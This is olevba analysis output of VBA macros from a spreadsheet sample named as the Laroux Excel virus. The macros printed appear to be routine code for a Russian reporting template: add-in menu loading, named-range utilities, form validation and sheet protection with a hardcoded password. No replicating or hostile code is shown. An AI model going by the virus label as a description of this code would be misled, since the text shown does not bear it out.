olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux.of.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ЭтаКнига.cls 
in file: Virus.MSExcel.Laroux.of.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/ЭтаКнига'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim SErr As Boolean

Private Sub Workbook_BeforeClose(Cancel As Boolean)

End Sub

Private Sub Workbook_BeforeSave(ByVal SaveAsUI As Boolean, Cancel As Boolean)

    Application.Calculate
    Dim Proverka As Integer
    If ActiveWorkbook.Sheets(sh1).cells(1, 1) = 0 Then
        MsgBox "В шаблоне нет ни одной организации!", vbOKOnly + vbExclamation, ThisWorkbook.name
        Exit Sub
    ElseIf PROV.checkBeforSaveAll > 1 Then
        If PROV.ProvFlagOsh = True Then
            MsgBox "Шаблон сохранен, но НЕ БУДЕТ принят к рассмотрению из-за невыполнения ОБЯЗАТЕЛЬНЫХ условий! См. лист 'Проверка'!", vbOKOnly + vbExclamation, "Результат проверки"
            ActiveWorkbook.Sheets("Проверка").Activate
        Else
            MsgBox "Шаблон сохранен и будет принят к рассмотрению, но обратите ВНИМАНИЕ на НЕВЫПОЛНЕНИЕ ПРЕДУПРЕДИТЕЛЬНЫХ условий! См. лист 'Проверка'!", vbOKOnly + vbExclamation, "Результат проверки"
            ActiveWorkbook.Sheets("Проверка").Activate
        End If
        Exit Sub
    End If
    Cancel = False

    On Error GoTo errhandler

    Dim status As Integer
    Dim response As Integer
    Dim Error_string As String
    status = ThisWorkbook.CustomDocumentProperties("Status")
    If status > 2 Then
        MsgBox "Документ подписан ЭЦП и не может быть изменен", vbExclamation + vbOKOnly, ThisWorkbook.name
        Cancel = True
        Exit Sub
    End If
    ThisWorkbook.CustomDocumentProperties("Status") = 1
    response = vbNo
    MsgBox "Шаблон готов к сохранению без замечаний!", vbInformation, "Результат проверки"
    If response = vbYes Then
        Error_string = is_ok

        If Error_string <> "" Then
            MsgBox Error_string, vbInformation + vbOKOnly, "Ошибка формирования!"
            ThisWorkbook.CustomDocumentProperties("Status") = 1
            Exit Sub
        End If

        ThisWorkbook.CustomDocumentProperties("Status") = 2

        If Not ParseBook2 Then
            MsgBox "Ошибка при вызове команды формирования XML-документа. Если АРМ СЕМ не установлен - установите его, если пункт АРМ СЕМ присутствует в меню - выберите АРМ СЕМ->XML->Сформировать XML-документ", vbOKOnly + vbExclamation, ThisWorkbook.name
            Cancel = True
            Exit Sub
        End If
    ElseIf response = vbCancel Then
        Cancel = True
    End If
    Exit Sub
errhandler:
    MsgBox err.Description, vbOKOnly + vbExclamation, ThisWorkbook.name
End Sub



Private Sub Workbook_Open()

Dim a As Excel.AddIn
'Application.Calculation = xlCalculationAutomatic ' чтобы пересчет формул осуществлялся автоматически
''protUnprot True True
    If IsNull(LookupMenu(Application.CommandBars("Worksheet Menu Bar"), "АРМ СЕМ")) Then
        For Each a In Excel.AddIns
            If a.name = "ARMSEM.xla" Then
                If Not TryRun(a) Then
                    If Not TryReInstall(a) Then
                        TryReOpen a
                    End If
                End If
            End If
        Next
    End If

  'SErr = False
  'HypLink.HypFl = True

    If IsNull(LookupMenu(Application.CommandBars("Worksheet Menu Bar"), "АРМ СЕМ")) Then
        ' Ни один из известных мне способов не сработал
        ' User, тебе не повезло!
        MsgBox "Не удалось вывести пункт меню АРМ СЕМ. Для активации меню используйте Сервис->Надстройки и выберите АРМ СЕМ вручную.", vbOKOnly + vbExclamation, ThisWorkbook.name
    End If

    If Len(ActiveWorkbook.Sheets("Список организаций").Range("I7").Value) = 0 Then
        ActiveWorkbook.Sheets(sh1).Visible = xlVeryHidden
        ActiveWorkbook.Sheets(sh2).Visible = xlVeryHidden

        ActiveWorkbook.Sheets(sh4).Visible = xlVeryHidden
'        ActiveWorkbook.Sheets(sh5).Visible = xlVeryHidden
'        ActiveWorkbook.Sheets(sh6).Visible = xlVeryHidden
        ActiveWorkbook.Sheets("Комментарии").Visible = xlVeryHidden
        ActiveWorkbook.Sheets("Проверка").Visible = xlVeryHidden

          ActiveWorkbook.Sheets("Свод").Visible = xlVeryHidden
        ActiveWorkbook.Sheets("Ошибки загрузки").Visible = xlVeryHidden

        ActiveWorkbook.Sheets("Инструкция").Activate
        ActiveWorkbook.Sheets("Инструкция").CommandButton1.Enabled = True
        ActiveWorkbook.Sheets("Инструкция").CommandButton1.Visible = True
    Else
        ActiveWorkbook.Sheets(sh1).Visible = True
        ActiveWorkbook.Sheets(sh2).Visible = True

        ActiveWorkbook.Sheets(sh4).Visible = True
'        ActiveWorkbook.Sheets(sh5).Visible = True
'        ActiveWorkbook.Sheets(sh6).Visible = True
        ActiveWorkbook.Sheets("Комментарии").Visible = True
        ActiveWorkbook.Sheets("Проверка").Visible = True

          ActiveWorkbook.Sheets("Свод").Visible = True
        ActiveWorkbook.Sheets("Ошибки загрузки").Visible = True

        'ActiveWorkbook.Sheets("Инструкция").Activate
        'ActiveWorkbook.Sheets("Инструкция").CommandButton1.Enabled = False
        'ActiveWorkbook.Sheets("Инструкция").CommandButton1.Visible = False
    End If
End Sub
Private Function TryRun(a As Excel.AddIn) As Boolean
    On Error GoTo errhandler
    Application.Run "'" & a.FullName & "'!SetupMenus"
    TryRun = True
    Exit Function
errhandler:
    TryRun = False
End Function
Private Function TryReInstall(a As Excel.AddIn) As Boolean
    On Error GoTo errhandler
    a.Installed = False
    a.Installed = True
    TryReInstall = True
    Exit Function
errhandler:
    TryReInstall = False
End Function
Private Function TryReOpen(a As Excel.AddIn) As Boolean
    On Error GoTo errhandler
    Workbooks.Open a.FullName
    TryReOpen = True
    Exit Function
errhandler:
    TryReOpen = False
End Function







-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Laroux.of.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист9.cls 
in file: Virus.MSExcel.Laroux.of.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист9'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NamedRangeAppender.bas 
in file: Virus.MSExcel.Laroux.of.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/NamedRangeAppender'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

' Версия:     1.1 (22.02.2006)
' Автор:      Компьюлинк
' Назначение: Модуль обеспечивает работу с именованными диапазонами


' Процедура возвращает префикс для именованного диапазона
' Формат имен диапазонов <Префикс>?<Имя>

Public Function GetNamePrefix(name As String) As String
    Dim i As Integer
    i = VBA.InStr(name, "?")

    If i = 0 Then
        GetNamePrefix = ""
    Else
        GetNamePrefix = VBA.Mid(name, 1, i - 1)
    End If
End Function


' Процедура возвращает имя диапазона без префикса

Public Function GetLocalName(name As String) As String
    Dim i As Integer
    i = VBA.InStr(name, "?")

    If i = 0 Then
        GetLocalName = "???"
    Else
        GetLocalName = VBA.Mid(name, i + 1)
    End If
End Function



' Функция добавляет к диапазону ячеек другой диапазон, определяемый именем

Public Function AppendNameToRange(r As Range, n As name) As Range
    On Error GoTo errhandler

    If r Is Nothing Then
        Set AppendNameToRange = Range(n.name)
    Else
        Set AppendNameToRange = Application.Union(r, Range(n.name))
    End If

    Exit Function
errhandler:
    Set AppendNameToRange = r
End Function

' Функция возвращает имя листа, на котором находится именованный диапазон

Public Function GetNameWorksheetName(n As name) As String
    On Error GoTo errhandler

    GetNameWorksheetName = Range(n.name).Worksheet.name

    Exit Function
errhandler:
    GetNameWorksheetName = ""
End Function

' Функция сравнивает два диапазона

Public Function rangesEqual(R1 As Excel.Range, R2 As Excel.Range) As Boolean
    Dim r As Excel.Range

    If R1 Is Nothing Or R2 Is Nothing Then
        rangesEqual = False
    Else
        Set r = Intersect(R1, R2)
        If r Is Nothing Then
            rangesEqual = False
        ElseIf Union(R1, R2).Address = r.Address Then
            rangesEqual = True
        Else
            rangesEqual = False
        End If
    End If
End Function

' Функция возвращает имя первого диапазона, совпадающего
' с выделенными пользователем ячейками

Public Function SelectionRangeName() As String
    Dim nam As Excel.name
    Dim r As Excel.Range

    For Each nam In Names
        Set r = nvlRefersToRange(nam)

        If Not r Is Nothing Then
            If r.Worksheet.name = Selection.Worksheet.name Then
                If rangesEqual(Selection, r) Then
                    SelectionRangeName = nam.name
                    Exit Function
                End If
            End If
        End If
    Next nam
    
    SelectionRangeName = ""
End Function
' Функция возвращает Nothing, если именованый диапазон не существует

Public Function nvlRefersToRange(n As Excel.name) As Excel.Range
    On Error GoTo errhandler

    Set nvlRefersToRange = Range(n.name)

    Exit Function
errhandler:
    Set nvlRefersToRange = Nothing
End Function

' Функция проверяет, существует ли имя

Public Function nameExists(name As String, ws As Worksheet) As Boolean
    Dim n As Excel.name

    On Error GoTo errhandler

    Set n = ws.parent.Names(name)
    nameExists = True
    Exit Function
errhandler:
    nameExists = False
End Function


Public Function nameExists2(name As String) As Boolean
    Dim r As Range

    On Error GoTo errhandler

    Set r = Range(name)
    nameExists2 = True
    Exit Function
errhandler:
    nameExists2 = False
End Function


' Функция добавляет ячейки к именованному диапазону.
' Если диапазон состоит из многих областей (больше, чем
' может содержать строка RefersTo), то такой диапазон
' разбивается на несколько поддиапазонов, которым
' также присваиваются имена

Public Sub addRangeToName(r As Excel.Range, n As Excel.name)
    Dim R1 As Excel.Range
    Dim R2 As Excel.Range
    Dim n1 As Excel.name
    Dim wb As Excel.Workbook



    '-------------------------------
    'Set r1 = n.RefersToRange  ' - не работает
    Set R1 = Range(n.name)     ' - работает
    '-------------------------------
    
    Set wb = R1.Worksheet.parent

    ' Проверим, можно ли обойтись малой кровью -
    ' ускорение работы где-то на порядок
'    On Error GoTo errhandler
'    address$ = n.RefersTo
'    address2$ = "'" & r.Worksheet.name & "'!" & r.AddressLocal
'    If address$ = "=" Then
'        n.RefersTo = address$ & address2$
'        Exit Sub
'    ElseIf Len(address$) + 1 + Len(address2$) <= 255 Then
'        n.RefersTo = address$ & "," & address2$
'        Exit Sub
'    End If
'
'errhandler:
'    Err.Clear

    ' Получить объединенный диапазон и
    ' удалить ненужные имена. Кстати,
    ' union объединяет две смежные области
    ' в одну, что также позволяет сэкономить
    ' на количестве имен
    Dim pattern$
    If Not R1 Is Nothing Then
        Set R2 = Union(r, R1)
        pattern$ = "*_" & Replace(n.name, "?", "[?]")
        For Each n1 In wb.Names
            If n1.name Like pattern$ Then
                n1.Delete
            End If
        Next n1
    Else
        Set R2 = r
    End If

    ' Будем строить (при необходимости)
    ' пирамиду имен. Для этого считываем адреса
    ' областей в массив. В него же будем записывать
    ' имена созданных дочерних диапазонов
    Dim an#
    an# = R2.Areas.Count
    Dim ar() As String
    ReDim ar(2 * an#)
    Dim i#, j#, t#
    i# = LBound(ar)
    For Each R1 In R2.Areas
        ar(i#) = "'" & R1.Worksheet.name & "'!" & R1.AddressLocal
        i# = i# + 1
    Next R1

    j# = LBound(ar) + 1
    t# = 1
    Dim Address$
    Address$ = "=" & ar(LBound(ar))

    While j# < i#
        If Len(Address$) + 1 + Len(ar(j#)) > 150 Then
            wb.Names.Add name:="P" & t# & "_" & n.name, RefersTo:=Address$, Visible:=False
            ar(i#) = "P" & t# & "_" & n.name
            i# = i# + 1
            t# = t# + 1
            Address$ = "=" & ar(j#)
        Else
            Address$ = Address$ & "," & ar(j#)
        End If
        j# = j# + 1
    Wend
    
    n.RefersTo = Address$
End Sub

' Объединить диапазоны

Public Sub AppendNames(copy_range As Range, dest_range As Range, prefix As String)
    Dim nam As Excel.name

    For Each nam In ActiveWorkbook.Names
        If GetNamePrefix(nam.name) = prefix Then
            CopyHasAreas copy_range, dest_range, nam
        End If
    Next nam
End Sub

Function CopyHasAreas(copy_range As Range, dest_range As Range, nam As name) As Boolean
    Dim a As Range

    Dim OffsetX#, OffsetY#
    OffsetX# = dest_range.Column - copy_range.Column
    OffsetY# = dest_range.Row - copy_range.Row

    For Each a In Range(nam.name).Areas
        If a.Worksheet.name = copy_range.Worksheet.name Then
            If rangesEqual(a, Intersect(a, copy_range)) Then
                addRangeToName a.Offset(OffsetY#, OffsetX#), nam
            End If
        End If
    Next a
End Function


Sub ClearNames(prefix As String)
    Dim nam As Excel.name

'    On Error GoTo errhandler

    For Each nam In Names
        If InStr(nam.name, prefix) Then
            nam.Delete
        End If
    Next nam

    Exit Sub
'errhandler:
'    MsgBox Err.Description, vbOKOnly + vbExclamation, Err.Source
End Sub


Public Function ISect(R1 As Range, R2 As Range) As Range
    Set ISect = Intersect(R1, R2)
End Function

-------------------------------------------------------------------------------
VBA MACRO Wrapper.bas 
in file: Virus.MSExcel.Laroux.of.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Wrapper'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Функция возвращает диапазон, по которому следует фильтровать данные

Function GetFilterRange(r As Range, v As Variant) As Range
    Dim cell As Range

    If r.Columns.Count > 1 Then   ' Диапазон по горизонтали
        For Each cell In r
            If cell.Value = v Then
                If GetFilterRange Is Nothing Then
                    Set GetFilterRange = cell.Worksheet.Columns(cell.Column)
                Else
                    Set GetFilterRange = Union(GetFilterRange, cell.Worksheet.Columns(cell.Column))
                End If
            End If
        Next cell
    Else                    ' Диапазон по вертикали
        For Each cell In r
            If cell.Value = v Then
                If GetFilterRange Is Nothing Then
                    Set GetFilterRange = cell.Worksheet.Rows(cell.Row)
                Else
                    Set GetFilterRange = Union(GetFilterRange, cell.Worksheet.Rows(cell.Row))
                End If
            End If
        Next cell
    End If
End Function


' Функция возвращает ячейку из диапазона r1, отфильтрованную по условию r2 = v2

Public Function GetValueFilter1(R1 As Range, R2 As Range, v2 As Variant, Optional R3 As Range) As Range
    On Error GoTo errhandler

    If IsMissing(R3) Then
        Set GetValueFilter1 = Intersect(R1, GetFilterRange(R2, v2))
    ElseIf R3 Is Nothing Then
        Set GetValueFilter1 = Intersect(R1, GetFilterRange(R2, v2))
    Else
        Set GetValueFilter1 = Intersect(R1, GetFilterRange(R2, v2), R3)
    End If

    Exit Function
errhandler:
    Set GetValueFilter1 = Nothing
End Function


' Функция возвращает ячейку из диапазона r1, отфильтрованную по условию r2 = v2 and r3 = v3

Public Function GetValueFilter2(R1 As Range, R2 As Range, v2 As Variant, R3 As Range, v3 As Variant, Optional R4 As Range) As Range
    On Error GoTo errhandler

    If IsMissing(R4) Then
        Set GetValueFilter2 = Intersect(R1, GetFilterRange(R2, v2), GetFilterRange(R3, v3))
    ElseIf R4 Is Nothing Then
        Set GetValueFilter2 = Intersect(R1, GetFilterRange(R2, v2), GetFilterRange(R3, v3))
    Else
        Set GetValueFilter2 = Intersect(R1, GetFilterRange(R2, v2), GetFilterRange(R3, v3), R4)
    End If

    Exit Function
errhandler:
    Set GetValueFilter2 = Nothing
End Function


' Функция возвращает ячейку из диапазона r1, отфильтрованную по условию r2 = v2 and r3 = v3 and r4 = v4

Public Function GetValueFilter3(R1 As Range, R2 As Range, v2 As Variant, R3 As Range, v3 As Variant, R4 As Range, v4 As Variant, Optional r5 As Range) As Range
    On Error GoTo errhandler

    If IsMissing(r5) Then
        Set GetValueFilter3 = Intersect(R1, GetFilterRange(R2, v2), GetFilterRange(R3, v3), GetFilterRange(R4, v4))
    ElseIf r5 Is Nothing Then
        Set GetValueFilter3 = Intersect(R1, GetFilterRange(R2, v2), GetFilterRange(R3, v3), GetFilterRange(R4, v4))
    Else
        Set GetValueFilter3 = Intersect(R1, GetFilterRange(R2, v2), GetFilterRange(R3, v3), GetFilterRange(R4, v4), r5)
    End If

    Exit Function
errhandler:
    Set GetValueFilter3 = Nothing
End Function


Public Function SumValueFilter1(R1 As Range, R2 As Range, v2 As Variant, Optional R3 As Range) As Variant
    Dim cell As Range
    Dim cells As Range

    On Error GoTo errhandler

    SumValueFilter1 = CDbl(0)
    Set cells = GetValueFilter1(R1, R2, v2, R3)
    If cells Is Nothing Then
        Exit Function
    Else
        For Each cell In cells
            SumValueFilter1 = SumValueFilter1 + CDbl(cell.Value)
        Next cell
    End If

    Exit Function
errhandler:
    SumValueFilter1 = CVErr(xlErrNum)
End Function


Public Function SumValueFilter2(R1 As Range, R2 As Range, v2 As Variant, R3 As Range, v3 As Variant, Optional R4 As Range) As Variant
    Dim cell As Range
    Dim cells As Range

    On Error GoTo errhandler

    SumValueFilter2 = CDbl(0)
    Set cells = GetValueFilter2(R1, R2, v2, R3, v3, R4)
    If cells Is Nothing Then
        Exit Function
    Else
        For Each cell In cells
            SumValueFilter2 = SumValueFilter2 + CDbl(cell.Value)
        Next cell
    End If

    Exit Function
errhandler:
    SumValueFilter2 = CVErr(xlErrNum)
End Function


Public Function SumValueFilter3(R1 As Range, R2 As Range, v2 As Variant, R3 As Range, v3 As Variant, R4 As Range, v4 As Variant, Optional r5 As Range) As Variant
    Dim cell As Range
    Dim cells As Range

    On Error GoTo errhandler

    SumValueFilter3 = CDbl(0)
    Set cells = GetValueFilter3(R1, R2, v2, R3, v3, R4, v4, r5)
    If cells Is Nothing Then
        Exit Function
    Else
        For Each cell In cells
            SumValueFilter3 = SumValueFilter3 + CDbl(cell.Value)
        Next cell
    End If

    Exit Function
errhandler:
    SumValueFilter3 = CVErr(xlErrNum)
End Function


Public Function ExcelIntersect(R1 As Range, R2 As Range) As Range
    On Error GoTo errhandler
    Set ExcelIntersect = Intersect(R1, R2)
    Exit Function
errhandler:
    Set ExcelIntersect = Nothing
End Function



Public Function ParseBook2() As Boolean
    Dim ctl As Variant
    Dim btn As CommandBarButton

    On Error GoTo errhandler

    Set ctl = LookupMenu(CommandBars("Worksheet Menu Bar"), "АРМ СЕМ")
    Set ctl = LookupMenu(ctl, "XML")
    Set btn = LookupMenu(ctl, "Сформировать XML-документ")
    If Not TryExecute(btn) Then
        ParseBook2 = TryRun(btn)
    Else
        ParseBook2 = True
    End If

    Exit Function
errhandler:
    ParseBook2 = False
End Function
Private Function TryExecute(btn As CommandBarButton) As Boolean
    On Error GoTo errhandler
    btn.Execute
    TryExecute = True
    Exit Function
errhandler:
    TryExecute = False
End Function
Private Function TryRun(btn As CommandBarButton) As Boolean
    On Error GoTo errhandler
    Application.Run btn.OnAction
    TryRun = True
    Exit Function
errhandler:
    TryRun = False
End Function


Public Function LookupMenu(ByRef parent As Variant, caption As String) As Variant
    Dim ctl As CommandBarControl

    For Each ctl In parent.Controls
        If ctl.caption = caption Then
            Set LookupMenu = ctl
            Exit Function
        End If
    Next ctl
    
    LookupMenu = Null
End Function


Public Function nErr(val As Variant, Optional val2 As Variant) As Variant
    If IsError(val) Then
        If IsMissing(val2) Then
            nErr = Empty
        Else
            nErr = val2
        End If
    Else
        nErr = val
    End If
End Function


Public Function ProcedureExists(name As String, module As Variant) As Boolean
    On Error Resume Next
    ProcedureExists = module.ProcStartLine(name, vbext_pk_Proc) <> 0
End Function


Public Function CanAutomate() As Boolean
    CanAutomate = ThisWorkbook.CustomDocumentProperties("ARMSEM").Value
End Function
Public Function RegisterARMSEM() As Boolean
    Dim a As AddIn

    RemoveReferenceToARMSEM

    On Error GoTo errhandler

    For Each a In AddIns
        If a.name = "ARMSEM.xla" Then
            ThisWorkbook.VBProject.References.AddFromfile a.FullName
            RegisterARMSEM = True
            ThisWorkbook.CustomDocumentProperties("ARMSEM").Value = True
            Exit Function
        End If
    Next a
    
errhandler:
    RegisterARMSEM = False
    ThisWorkbook.CustomDocumentProperties("ARMSEM").Value = False
End Function
Public Sub RemoveReferenceToARMSEM()
    On Error Resume Next

    ThisWorkbook.VBProject.References.Remove ThisWorkbook.VBProject.References("ARMSEM")
End Sub

-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Laroux.of.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FormRegion.frm 
in file: Virus.MSExcel.Laroux.of.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/FormRegion'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub ComCancel_Click()
Unload Me
End Sub

Private Sub ComOK_Click()
Dim ws As Worksheet
Dim strdel As String

Set ws = ActiveWorkbook.Sheets(sh1)

If Help.PrinadlDiapazon(ActiveWorkbook.Sheets("TEHSHEET").Range("REGION"), ComboRegion.Value) = False Then
        MsgBox "РЕГИОН указан не верно!", vbCritical
Else
        strdel = MsgBox("Вы уверены в выборе региона: '" & ComboRegion.Value & "' ?", vbYesNo + vbQuestion, "Подтверждение!")
        If strdel = vbYes Then
            ' функция переопределения диапазонов и удаления не нужных регионов со служебных листов
            ws.Unprotect ("aq1sw2de3")
            ws.Range("I7").Value = ComboRegion.Value
            Label2.caption = "2"
            
            If reestr.FROM_REESTR(ComboRegion.Value) = True Then
                reestr.OKTMO_MO_NEW
                ws.Range("B1").Value = 1
                flag = True
            Else
                reestr.OKTMO_MO_NEW
                ws.Range("B1").Value = 0
            End If
                ActiveWorkbook.Sheets(sh1).Visible = True
                ActiveWorkbook.Sheets(sh1).Activate
                
                ActiveWorkbook.Sheets(sh2).Visible = True
                
                ActiveWorkbook.Sheets(sh4).Visible = True
'                ActiveWorkbook.Sheets(sh5).Visible = True
'                ActiveWorkbook.Sheets(sh6).Visible = True
                ActiveWorkbook.Sheets("Проверка").Visible = True
                ActiveWorkbook.Sheets("Комментарии").Visible = True
                
                ActiveWorkbook.Sheets("Свод").Visible = True
                ActiveWorkbook.Sheets("Ошибки загрузки").Visible = True
        
                
                ActiveWorkbook.Sheets("Инструкция").CommandButton1.Enabled = False
                ActiveWorkbook.Sheets("Инструкция").CommandButton1.Visible = False
                ws.Protect Password:="aq1sw2de3", DrawingObjects:=False, Contents:=True, Scenarios:=True _
                , AllowFormattingColumns:=True, AllowFormattingRows:=True
                Unload Me
        End If

    End If
End Sub

Private Sub Label2_Click()

End Sub

Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
If Label2.caption = "1" Then
    ActiveWorkbook.Sheets("Инструкция").Activate
    ActiveWorkbook.Sheets("Инструкция").CommandButton1.Visible = True
End If
End Sub


-------------------------------------------------------------------------------
VBA MACRO Лист2.cls 
in file: Virus.MSExcel.Laroux.of.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FormOrg.frm 
in file: Virus.MSExcel.Laroux.of.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/FormOrg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub nds_Change()

End Sub

' ДОБАВИТЬ/ИЗМЕНИТЬ
Private Sub OK_Click()

flag = False
If Proverka = True Then
    PerConst.fil = Trim(FormOrg.fil)
    PerConst.org = Trim(FormOrg.org)
    PerConst.pr_fil = Trim(FormOrg.pr_fil)
    PerConst.fil = Trim(FormOrg.fil)
    PerConst.inn = Trim(FormOrg.inn)
    PerConst.kpp = Trim(FormOrg.kpp)
    PerConst.vprod = Trim(FormOrg.vprod)
   
    PerConst.od = Trim(FormOrg.od)
    PerConst.nds = Trim(FormOrg.nds)
    flag = True
    Unload Me
End If

End Sub
Private Sub Cancel_Click()
    Unload Me
End Sub
' определение признака филиала
Private Sub pr_fil_Change()
    UpdPrFil
End Sub
' инициализация формы - подстановка значений из формы FormReestr
Private Sub UserForm_Initialize()
flag = False

    FormOrg.fil = PerConst.fil
    FormOrg.org = PerConst.org
    FormOrg.pr_fil = PerConst.pr_fil
    FormOrg.fil = PerConst.fil
    FormOrg.inn = PerConst.inn
    FormOrg.kpp = PerConst.kpp
    FormOrg.vprod = PerConst.vprod
'    FormOrg.pp = PerConst.pp
    FormOrg.od = PerConst.od
    FormOrg.nds = PerConst.nds

End Sub

' КОРРЕКТИРОВКА формы в зависимости от признака филиала
Sub UpdPrFil()
  If pr_fil.Value = "да" Then
        FormOrg.fil.Locked = False
        FormOrg.fil.Enabled = True
        FormOrg.LOrg = "Наименование ГОЛОВНОЙ организации"
        FormOrg.LKpp = "КПП данного ФИЛИАЛА"
        FormOrg.LInn = "ИНН ГОЛОВНОЙ организации"
        FormOrg.LFil = "Наименование ФИЛИАЛА"
    Else
        FormOrg.fil.Locked = True
        FormOrg.fil.Enabled = False
        FormOrg.fil = ""
        
        FormOrg.LOrg = "Наименование организации"
        FormOrg.LInn = "ИНН организации"
        FormOrg.LKpp = "КПП организации"
        FormOrg.LFil = "Наименование филиала (Не указывается!!!)"
    End If
End Sub
' проверка при добавлениии или изменении
Function Proverka() As Boolean
Proverka = True
'признак филиала
If Len(Trim(FormOrg.pr_fil)) = 0 Then
    Proverka = False
    MsgBox "Укажите является ли данная организация филиалом!", vbOKOnly + vbExclamation, ThisWorkbook.name
    FormOrg.pr_fil.SetFocus
    GoTo end_:
End If

'организация
If Len(Trim(FormOrg.org)) = 0 Then
    Proverka = False
    MsgBox "Введите наименование организации!", vbOKOnly + vbExclamation, ThisWorkbook.name
    FormOrg.org.SetFocus
    GoTo end_:
End If

'ИНН
If Len(Trim(FormOrg.inn)) = 0 Then
    Proverka = False
    MsgBox "Введите ИНН!", vbOKOnly + vbExclamation, ThisWorkbook.name
    FormOrg.inn.SetFocus
    GoTo end_:
End If

If allCheck.InnCh(Trim(FormOrg.inn)) = False Then
    Proverka = False
    MsgBox "ИНН должен состоять из 10-12 цифр!", vbOKOnly + vbExclamation, ThisWorkbook.name
    FormOrg.inn.SetFocus
    GoTo end_:
End If

'КПП
If Len(Trim(FormOrg.kpp)) = 0 Then
    Proverka = False
    MsgBox "Введите КПП!", vbOKOnly + vbExclamation, ThisWorkbook.name
    FormOrg.kpp.SetFocus
    GoTo end_:
End If

If allCheck.KppCh(Trim(FormOrg.kpp)) = False Then
    Proverka = False
    MsgBox "КПП должен состоять из 9 цифр!", vbOKOnly + vbExclamation, ThisWorkbook.name
    FormOrg.kpp.SetFocus
    GoTo end_:
End If

'НАИМЕНОВАНИЕ ФИЛИАЛА
If pr_fil.Value = "да" And Len(Trim(FormOrg.fil)) = 0 Then
    Proverka = False
    MsgBox "Так как признак филиала - 'да'! Введите наименование филиала!", vbOKOnly + vbExclamation, ThisWorkbook.name
    FormOrg.fil.SetFocus
    GoTo end_:
End If

' Вид деятельности
If Len(Trim(FormOrg.vprod)) = 0 Then
    Proverka = False
    MsgBox "Выберите вид деятельности!", vbOKOnly + vbExclamation, ThisWorkbook.name
    FormOrg.vprod.SetFocus
    GoTo end_:
End If

' Действует
If Len(Trim(FormOrg.od)) = 0 Then
    Proverka = False
    MsgBox "Укажите осуществляет ли деятельность данная организация!", vbOKOnly + vbExclamation, ThisWorkbook.name
    FormOrg.od.SetFocus
    GoTo end_:
End If

' НДС
If Len(Trim(FormOrg.nds)) = 0 Then
    Proverka = False
    MsgBox "Укажите является ли данная организация плательщиком НДС!", vbOKOnly + vbExclamation, ThisWorkbook.name
    FormOrg.nds.SetFocus
    GoTo end_:
End If

end_:

End Function
' изменение вида деятельности
Private Sub vprod_Change()
UpdVProd
End Sub

' КОРРЕКТИРОВКА ПЕРЕПРОДАЖИ в ЗАВИСИМОСТИ от ВИДА ДЕЯТЕЛЬНОСТИ
Sub UpdVProd()

End Sub
-------------------------------------------------------------------------------
VBA MACRO Лист11.cls 
in file: Virus.MSExcel.Laroux.of.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист11'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Base 1
Option Explicit

Private Sub Worksheet_Change(ByVal Target As Range)

On Error GoTo err_

Dim ws1 As Worksheet
Set ws1 = ActiveWorkbook.Sheets(sh1)

Dim r As Range
Dim R1 As Range
    
If Target.Address = "$I$10" Or Target.Address = "$I$10:$J$10" Then
    If Len(Target.cells(1, 1).Value) = 0 Then
        ws1.Unprotect ("aq1sw2de3")
        Set R1 = ActiveWorkbook.Sheets("REESTR").Range("R2")
        R1.name = "OKTMO_LIST1"
        Target.cells(1, 1).Offset(0, 1).ClearContents
        ActiveSheet.Protect Password:="aq1sw2de3", DrawingObjects:=False, Contents:=True, Scenarios:=True _
        , AllowFormattingColumns:=True, AllowFormattingRows:=True
        Exit Sub
    Else
        ws1.Unprotect ("aq1sw2de3")
        Target.cells(1, 1).Offset(0, 2).ClearContents
        reestr.OKTMO_FORM Target.Text
        If ActiveWorkbook.Sheets("REESTR").Range("OKTMO_LIST1").Rows.Count = 1 Then
            ActiveWorkbook.Sheets(sh1).Range("K10").Value = ActiveWorkbook.Sheets("REESTR").Range("OKTMO_LIST1").cells(1, 1).Value
        End If
        ActiveSheet.Protect Password:="aq1sw2de3", DrawingObjects:=False, Contents:=True, Scenarios:=True _
        , AllowFormattingColumns:=True, AllowFormattingRows:=True
        Exit Sub
    End If
End If

' проверка ОКТМО
If Target.cells(1, 1).Address = "$K$10" And allCheck.fl3 = False And Len(Target.cells(1, 1).Value) > 0 Then
    If allCheck.OktmoCh(Target.Value) = False Then
        MsgBox "ОКТМО должен содержать 7-8 цифр!", vbCritical
        Target.cells(1, 1).Worksheet.Activate
        Target.cells(1, 1).Select
        Target.cells(1, 1).ClearContents
    End If
ElseIf Target.Address = "$K$10" And allCheck.fl3 = True Then
    allCheck.fl3 = False
End If

Exit Sub
err_:

End Sub

